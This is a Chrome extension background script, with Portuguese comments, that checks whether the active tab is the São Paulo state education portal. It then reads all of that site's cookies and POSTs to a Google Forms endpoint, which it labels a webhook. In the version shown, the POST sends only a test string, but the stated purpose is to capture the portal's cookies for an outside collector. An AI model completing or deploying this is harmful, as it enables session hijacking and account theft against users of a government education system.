chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getAndSendCookies") {
    // Pega a aba ativa
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      const tab = tabs[0];
      // Checa se está na página desejada
      if (tab && tab.url && tab.url.startsWith("https://sed.educacao.sp.gov.br/Inicio")) {
        // Pega cookies da página
        chrome.cookies.getAll({ url: tab.url }, function (cookies) {
          // Monta objeto para enviar
          const cookieObj = {};
          cookies.forEach(cookie => {
            cookieObj[cookie.name] = cookie.value;
          });

          // Envia para o webhook
          fetch(
            "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeH6hDfEOI6jvgDsdkuuUeah_FU3dPGxZZr-sBBkIjj4Hkwog/formResponse",
            {
              method: "POST",
              mode: "no-cors",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
              },
              body: "entry.667481942=" + encodeURIComponent("teste g4")
            }
          )
          .then(response => sendResponse({"success": true}))
          .catch((error) => {
            sendResponse({"success": false, "error": error })
          });
          
          return true;
        });
      } else {
        sendResponse({ success: false, error: "Abra a página https://sed.educacao.sp.gov.br/Inicio para capturar os cookies." });
      }
    });
    return true; // Necessário para sendResponse assíncrono
  }
});